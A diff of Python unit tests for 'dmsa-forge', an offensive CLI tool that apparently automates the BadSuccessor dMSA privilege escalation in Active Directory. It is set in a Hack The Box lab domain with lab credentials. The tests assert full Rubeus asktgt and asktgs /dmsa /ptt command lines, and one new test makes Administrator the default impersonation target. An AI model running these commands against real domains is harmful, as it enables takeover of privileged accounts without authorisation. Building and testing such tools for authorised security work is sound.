@@ -124,36 +124,12 @@ class DNValidationTests(unittest.TestCase):
 
 
 class CLIBehaviorTests(unittest.TestCase):
-    def test_actions_help_lists_common_actions(self):
-        result = run_cli('actions')
-
-        self.assertEqual(result.returncode, 0, msg=result.stderr)
-        self.assertIn('search', result.stdout)
-        self.assertIn('add', result.stdout)
-        self.assertIn('update', result.stdout)
-        self.assertIn('dmsa-forge help ACTION', result.stdout)
-        self.assertNotIn('doctor', result.stdout)
-        self.assertNotIn('guidance', result.stdout)
-        self.assertNotIn('modify', result.stdout)
-        self.assertNotIn('  completion', result.stdout)
-
-    def test_topicless_help_omits_diagnostics(self):
-        result = run_cli('help')
-
-        self.assertEqual(result.returncode, 0, msg=result.stderr)
-        self.assertIn('dmsa-forge help add', result.stdout)
-        self.assertNotIn('Diagnostics:', result.stdout)
-        self.assertNotIn('doctor', result.stdout)
-
-    def test_examples_help_prints_copy_ready_templates(self):
-        result = run_cli('examples')
-
-        self.assertEqual(result.returncode, 0, msg=result.stderr)
-        self.assertIn('Preview an add without LDAP', result.stdout)
-        self.assertIn('Ultra-quiet JSON report to file', result.stdout)
-        self.assertIn("--target-account 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'", result.stdout)
-        self.assertNotIn('--target-account Administrator', result.stdout)
-        self.assertNotIn('\\\n', result.stdout)
+    def test_removed_help_utilities_return_migration_errors(self):
+        for command in ('actions', 'examples', 'help'):
+            result = run_cli(command)
+            self.assertEqual(result.returncode, 2)
+            self.assertIn('was removed', result.stderr)
+            self.assertIn('dmsa-forge ACTION -h', result.stderr)
 
     def test_startup_banner_is_professional_and_local(self):
         output = io.StringIO()
@@ -202,17 +178,17 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertIsNone(forge.check_account_exists(connection, 'CN=redpen,OU=Staff,DC=test,DC=local'))
 
     def test_action_specific_help(self):
-        result = run_cli('help', 'add')
+        result = run_cli('add', '-h')
 
         self.assertEqual(result.returncode, 0, msg=result.stderr)
-        self.assertIn('add - create and verify a dMSA object', result.stdout)
+        self.assertIn('usage: dmsa-forge add [domain/]username[:password] --target-ou OU_DN [options]', result.stdout)
         self.assertIn('--target-account', result.stdout)
 
     def test_unknown_action_specific_help_fails_cleanly(self):
-        result = run_cli('help', 'unknown')
+        result = run_cli('plan', 'unknown')
 
         self.assertEqual(result.returncode, 2)
-        self.assertIn('Unknown help topic', result.stderr)
+        self.assertIn('Unknown plan action', result.stderr)
 
     def test_action_first_and_legacy_action_cannot_be_mixed(self):
         result = run_cli(
@@ -242,13 +218,15 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertNotIn('dmsa-forge doctor [domain/]username[:password]', result.stdout)
         self.assertNotIn('doctor       Inspect local inputs without LDAP writes.', result.stdout)
         self.assertNotIn(cli.TOOL_DESCRIPTION + '\n\npositional arguments:', result.stdout)
-        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options. Completion for this shell session: eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
-        self.assertNotIn('Completion for this shell session:\n', result.stdout)
+        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options.', result.stdout)
+        self.assertNotIn('Completion for this shell session', result.stdout)
         self.assertIn('-v, --version', result.stdout)
         self.assertNotIn('--version, -v', result.stdout)
         self.assertNotIn('Legacy', result.stdout)
         self.assertNotIn('LDAP' + '-stage research', result.stdout)
-        self.assertIn('eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
+        self.assertNotIn('eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
+        self.assertNotIn('actions', result.stdout)
+        self.assertNotIn('examples', result.stdout)
 
     def test_empty_command_prints_help(self):
         result = run_cli(env_overrides={'SHELL': '/bin/zsh'})
@@ -260,10 +238,13 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertNotIn('dmsa-forge doctor', result.stdout)
         self.assertNotIn('dmsa-forge doctor [domain/]username[:password]', result.stdout)
         self.assertNotIn('doctor       Inspect local inputs without LDAP writes.', result.stdout)
-        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options. Completion for this shell session: eval "$(dmsa-forge --completion-script zsh)"', result.stdout)
+        self.assertIn('Use "dmsa-forge ACTION -h" for action-specific options.', result.stdout)
+        self.assertNotIn('Completion for this shell session', result.stdout)
         self.assertIn('-v, --version', result.stdout)
         self.assertNotIn('Legacy', result.stdout)
         self.assertNotIn('LDAP' + '-stage research', result.stdout)
+        self.assertNotIn('actions', result.stdout)
+        self.assertNotIn('examples', result.stdout)
 
     def test_main_restores_cwd_for_empty_command_path(self):
         with tempfile.TemporaryDirectory() as tmpdir:
@@ -356,6 +337,10 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertIn('complete -F _dmsa_forge_completion dmsaforge', bash.stdout)
         self.assertIn('update', zsh.stdout)
         self.assertIn('update', bash.stdout)
+        self.assertNotIn('actions', zsh.stdout)
+        self.assertNotIn('examples', zsh.stdout)
+        self.assertNotIn('actions', bash.stdout)
+        self.assertNotIn('examples', bash.stdout)
         self.assertNotIn('doctor', zsh.stdout)
         self.assertNotIn('doctor', bash.stdout)
         self.assertNotIn('completion:print completion', zsh.stdout)
@@ -387,15 +372,24 @@ class CLIBehaviorTests(unittest.TestCase):
         guidance = run_cli('guidance', 'test.local/admin:pw', '--dmsa-name', 'redpen')
         modify = run_cli('modify', *BASE_ARGS, '--dmsa-name', 'redpen', '--yes')
         completion = run_cli('completion', 'zsh', env_overrides={'SHELL': '/bin/zsh'})
+        actions = run_cli('actions')
+        examples = run_cli('examples')
+        help_command = run_cli('help', 'add')
         legacy_modify = run_cli('test.local/admin:pw', '--action', 'modify')
 
         self.assertEqual(guidance.returncode, 2)
         self.assertEqual(modify.returncode, 2)
         self.assertEqual(completion.returncode, 2)
+        self.assertEqual(actions.returncode, 2)
+        self.assertEqual(examples.returncode, 2)
+        self.assertEqual(help_command.returncode, 2)
         self.assertEqual(legacy_modify.returncode, 2)
         self.assertIn('successful add/verify output includes Kerberos commands', guidance.stderr)
         self.assertIn('use delete/add/verify', modify.stderr)
         self.assertIn('--completion-script zsh', completion.stderr)
+        self.assertIn('dmsa-forge ACTION -h', actions.stderr)
+        self.assertIn('dmsa-forge ACTION -h', examples.stderr)
+        self.assertIn('dmsa-forge ACTION -h', help_command.stderr)
         self.assertIn('use delete/add/verify', legacy_modify.stderr)
 
     def test_update_dry_run_uses_current_python_environment(self):
@@ -607,6 +601,25 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertNotIn('<redacted>', output)
         self.assertNotIn('<SID>', output)
 
+    def test_add_defaults_target_account_to_administrator(self):
+        result = run_cli(
+            'add',
+            'test.local/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--dmsa-name',
+            'redpen',
+            '--dry-run',
+            '--no-banner',
+        )
+        output = result.stdout + result.stderr
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        self.assertIn('Target Account:          Administrator (inferred)', output)
+        self.assertIn('msDS-ManagedAccountPrecededByLink:', output)
+        self.assertIn('DN resolved from Administrator', output)
+        self.assertNotIn('Action "add" requires', output)
+
     def test_human_next_step_suggests_dmsa_name_from_target_account(self):
         result = run_cli(
             'add',
@@ -689,11 +702,43 @@ class CLIBehaviorTests(unittest.TestCase):
 
         commands = [step['command'] for step in report['result']['next_steps']]
         joined = '\n'.join(commands)
-        self.assertIn(r'.\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /domain:eighteen.htb /dc:10.129.23.216 /outfile:adam.scott.kirbi /nowrap', joined)
+        self.assertIn(r'.\Rubeus.exe hash /user:adam.scott /password:iloveyou1 /domain:eighteen.htb', joined)
+        self.assertIn(r'.\Rubeus.exe asktgt /user:adam.scott /aes256:<AES256_HASH_FROM_RUBEUS_HASH> /domain:eighteen.htb /dc:10.129.23.216 /outfile:adam.scott.kirbi /nowrap', joined)
         self.assertIn(r".\Rubeus.exe asktgs /dmsa /opsec /service:krbtgt/EIGHTEEN.HTB /targetuser:'redpen$' /ticket:adam.scott.kirbi /dc:10.129.23.216 /ptt /nowrap", joined)
+        self.assertNotIn('asktgt /user:adam.scott /password:', joined)
         self.assertNotIn('--kerberos-guidance', joined)
         self.assertNotIn('<DC_IPV4>', joined)
         self.assertNotIn('<PASSWORD>', joined)
+
+    def test_auto_dc_ip_rejects_proxy_dns_and_special_addresses(self):
+        rejected = [
+            '224.0.0.1',
+            '127.0.0.1',
+            '169.254.1.10',
+            '0.0.0.0',
+            '255.255.255.255',
+            '240.0.0.1',
+        ]
+        for value in rejected:
+            self.assertFalse(cli.is_usable_auto_dc_ip(value), msg=value)
+            self.assertIsNone(cli.resolve_ipv4_address(value, usable_only=True), msg=value)
+
+        self.assertTrue(cli.is_usable_auto_dc_ip('10.129.23.216'))
+        self.assertEqual(cli.resolve_ipv4_address('224.0.0.1'), '224.0.0.1')
+
+    def test_kerberos_guidance_uses_placeholder_for_unusable_auto_dc_ip(self):
+        lines = cli.kerberos_guidance_lines(
+            domain='eighteen.htb',
+            username='adam.scott',
+            password='iloveyou1',
+            dmsa_name='redpen',
+            dc_host='224.0.0.1',
+        )
+        joined = '\n'.join(lines)
+
+        self.assertIn('Pass --dc-ip with the real DC IPv4', joined)
+        self.assertIn('/dc:<DC_IPV4>', joined)
+        self.assertNotIn('/dc:224.0.0.1', joined)
 
     def test_resolved_dc_ip_only_changes_kerberos_next_steps(self):
         options = execution_options(
@@ -714,6 +759,57 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertIn('--dc-host dc01.eighteen.htb', commands[0])
         self.assertNotIn('--dc-ip 10.129.23.216', commands[0])
         self.assertIn('/dc:10.129.23.216', '\n'.join(commands[2:]))
+
+    def test_run_rejects_unusable_auto_resolved_dc_ip(self):
+        class NoopLDAPCompat:
+            def __init__(self, **kwargs):
+                self.bound = True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, **kwargs):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                return True
+
+            def unbind(self):
+                self.bound = False
+
+        original_ldap = cli.LDAPCompat
+        original_resolve = cli.resolve_ipv4_address
+        try:
+            cli.LDAPCompat = NoopLDAPCompat
+
+            def fake_resolve(host, usable_only=False):
+                return None if usable_only else '224.0.0.1'
+
+            cli.resolve_ipv4_address = fake_resolve
+            options = execution_options(
+                action='search',
+                dc_host='dc01.eighteen.htb',
+                dc_host_supplied=True,
+                dc_ip=None,
+                include_sd=False,
+                search_summary=True,
+                skip_dc_prereq=True,
+            )
+            forge = cli.DMSAForge('adam.scott', 'iloveyou1', 'eighteen.htb', '', '', options)
+            with contextlib.redirect_stderr(io.StringIO()):
+                success = forge.run()
+        finally:
+            cli.LDAPCompat = original_ldap
+            cli.resolve_ipv4_address = original_resolve
+
+        self.assertTrue(success)
+        self.assertIsNone(getattr(options, 'resolved_dc_ip', None))
+        self.assertIsNone(forge._target_ip)
+        self.assertEqual(forge.report['connection']['dc_ip'], '(not set)')
+        self.assertTrue(any(
+            event['kind'] == 'dc_ip'
+            and event['status'] == 'rejected'
+            and '224.0.0.1' in event['detail']
+            for event in forge.report['inference']
+        ))
 
     def test_failed_execution_has_no_next_steps(self):
         options = execution_options(action='search')
@@ -1355,12 +1451,24 @@ class CLIBehaviorTests(unittest.TestCase):
     def test_kerberos_guidance_is_add_verify_option_not_action(self):
         add_help = run_cli('add', '--help-advanced')
         verify_help = run_cli('verify', '--help-advanced')
+        verify_dry_run = run_cli(
+            'verify',
+            'test.local/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--dmsa-name',
+            'redpen',
+            '--kerberos-guidance',
+            '--dry-run',
+            '--output-only',
+        )
         guidance = run_cli('guidance', 'test.local/admin:pw', '--dmsa-name', 'redpen', '--json')
 
         self.assertEqual(add_help.returncode, 0, msg=add_help.stderr)
         self.assertEqual(verify_help.returncode, 0, msg=verify_help.stderr)
-        self.assertIn('--kerberos-guidance', add_help.stdout)
-        self.assertIn('--kerberos-guidance', verify_help.stdout)
+        self.assertNotIn('--kerberos-guidance', add_help.stdout)
+        self.assertNotIn('--kerberos-guidance', verify_help.stdout)
+        self.assertEqual(verify_dry_run.returncode, 0, msg=verify_dry_run.stderr)
         self.assertEqual(guidance.returncode, 2)
         self.assertIn('successful add/verify output includes Kerberos commands', guidance.stderr)
 
@@ -1533,6 +1641,165 @@ class CLIBehaviorTests(unittest.TestCase):
         self.assertEqual(forge.report['result']['ou_count'], 1)
         self.assertEqual(forge.report['result']['search_base'], 'OU=Staff,DC=test,DC=local')
         self.assertIn('Domain Controller prerequisite check failed', forge.report['result']['dc_prereq_warning'])
+
+    def test_search_report_explains_badsuccessor_relevant_rights(self):
+        class EmptyRightsConnection:
+            def __init__(self):
+                self.bound = True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, search_base=None, search_filter=None, **kwargs):
+                if search_filter == '(objectClass=organizationalUnit)':
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'OU=Staff,DC=test,DC=local',
+                            {'distinguishedName': ['OU=Staff,DC=test,DC=local']},
+                        )
+                    ]
+                    return True
+                if search_filter == '(objectClass=domain)':
+                    self.entries = []
+                    return True
+                self.entries = []
+                return True
+
+        forge = minimal_forge()
+        forge._search_summary = False
+        forge._search_include_sd = True
+        forge._search_resolve_names = False
+        forge._skip_dc_prereq = True
+        forge._target_ou = 'OU=Staff,DC=test,DC=local'
+        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local', include_sd=True)
+
+        with contextlib.redirect_stderr(io.StringIO()):
+            success = forge.search_ous(EmptyRightsConnection())
+
+        self.assertTrue(success)
+        self.assertEqual(forge.report['result']['identity_count'], 0)
+        self.assertEqual(forge.report['result']['rights_label'], cli.BADSUCCESSOR_RIGHTS_LABEL)
+        self.assertIn('create dMSA objects', forge.report['result']['rights_meaning'])
+        self.assertIn('listed OUs', forge.report['result']['rights_meaning'])
+
+    def test_search_marks_rights_that_apply_to_bound_user_token_groups(self):
+        group_sid = 'S-1-5-21-1-2-3-1604'
+        user_sid = 'S-1-5-21-1-2-3-1101'
+
+        forge = minimal_forge()
+        forge._username = 'adam.scott'
+        forge._domain = 'test.local'
+        forge._search_summary = False
+        forge._search_include_sd = True
+        forge._search_resolve_names = False
+        forge._skip_dc_prereq = True
+        forge._target_ou = 'OU=Staff,DC=test,DC=local'
+        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local', include_sd=True)
+
+        class CurrentUserRightsConnection:
+            def __init__(self):
+                self.bound = True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
+                if search_filter == '(objectClass=organizationalUnit)':
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'OU=Staff,DC=test,DC=local',
+                            {
+                                'distinguishedName': ['OU=Staff,DC=test,DC=local'],
+                                'nTSecurityDescriptor': [b'fake-sd'],
+                            },
+                        )
+                    ]
+                    return True
+                if search_filter == '(objectClass=domain)':
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'DC=test,DC=local',
+                            {'objectSid': ['S-1-5-21-1-2-3']},
+                        )
+                    ]
+                    return True
+                if attributes and 'tokenGroups' in attributes:
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
+                            {
+                                'objectClass': ['top', 'person', 'user'],
+                                'objectSid': [user_sid],
+                                'tokenGroups': [group_sid],
+                                'sAMAccountName': ['adam.scott'],
+                                'cn': ['adam.scott'],
+                                'name': ['adam.scott'],
+                                'userPrincipalName': ['adam.scott@test.local'],
+                            },
+                        )
+                    ]
+                    return True
+                self.entries = []
+                return True
+
+        class FakeSid:
+            def __init__(self, sid):
+                self.sid = sid
+
+            def formatCanonical(self):
+                return self.sid
+
+        class FakeMask:
+            def __getitem__(self, key):
+                if key == 'Mask':
+                    return 0x10000000
+                raise KeyError(key)
+
+        class FakeAceData:
+            def __getitem__(self, key):
+                if key == 'Mask':
+                    return FakeMask()
+                if key == 'Sid':
+                    return FakeSid(group_sid)
+                raise KeyError(key)
+
+        class FakeAce:
+            def __getitem__(self, key):
+                if key == 'AceType':
+                    return 0
+                if key == 'Ace':
+                    return FakeAceData()
+                raise KeyError(key)
+
+        class FakeDacl:
+            aces = [FakeAce()]
+
+        class FakeSD:
+            def __init__(self, data=None):
+                pass
+
+            def __getitem__(self, key):
+                if key == 'Dacl':
+                    return FakeDacl()
+                if key == 'OwnerSid':
+                    return FakeSid(group_sid)
+                raise KeyError(key)
+
+        original_ldaptypes = cli.ldaptypes
+        try:
+            cli.ldaptypes = types.SimpleNamespace(
+                SR_SECURITY_DESCRIPTOR=FakeSD,
+                ACCESS_ALLOWED_ACE=types.SimpleNamespace(ACE_TYPE=0),
+            )
+            with contextlib.redirect_stderr(io.StringIO()):
+                success = forge.search_ous(CurrentUserRightsConnection())
+        finally:
+            cli.ldaptypes = original_ldaptypes
+
+        self.assertTrue(success)
+        self.assertEqual(forge.report['result']['bound_user']['status'], 'ok')
+        self.assertEqual(forge.report['result']['bound_user_match_count'], 1)
+        self.assertEqual(forge.report['result']['identities'][0]['sid'], group_sid)
+        self.assertEqual(forge.report['result']['identities'][0]['applies_to_bound_user'], 'yes')
+        self.assertEqual(forge.report['result']['_next_step_candidates'][0]['identity'], group_sid)
 
     def test_search_falls_back_to_authenticated_account_ou_when_broad_ou_search_fails(self):
         class FallbackConnection:
